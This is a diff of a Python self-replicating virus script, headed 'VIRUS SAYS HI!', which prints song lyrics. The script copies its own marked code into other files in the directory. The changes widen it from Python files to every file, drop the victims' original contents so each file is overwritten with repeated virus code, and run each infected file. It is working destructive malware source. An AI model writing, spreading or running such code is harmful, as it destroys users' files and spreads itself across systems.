@@ -1,8 +1,8 @@
 # VIRUS SAYS HI!
-# Copyright NarmakTwo, all rights reserved 
 import sys
 import glob
 import os
+ff = sys.argv[0]
 print('Never gonna give you up\nNever gonna let you down\nNever gonna run around, and desert you\nNever gonna make you cry\nNever gonna say goodbye\nNever gonna tell a lie, or hurt you\n')
 virus_code = []
 with open(sys.argv[0], 'r') as f:
@@ -15,7 +15,7 @@ for line in lines:
         virus_code.append(line)
     if line == "# VIRUS SAYS BYE!\n":
         break
-python_files = glob.glob('*.py') + glob.glob('*.pyw')
+python_files = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*')
 for file in python_files:
     with open(file, 'r') as f:
         file_code = f.readlines()
@@ -28,8 +28,8 @@ for file in python_files:
         final_code = []
         final_code.extend(virus_code)
         final_code.extend('\n')
-        final_code.extend(file_code)
         with open(file, 'w') as f:
+          for i in range(20):
             f.writelines(final_code)
 for i in python_files:
   os.system(f'python3 {os.path.abspath(file)} $')
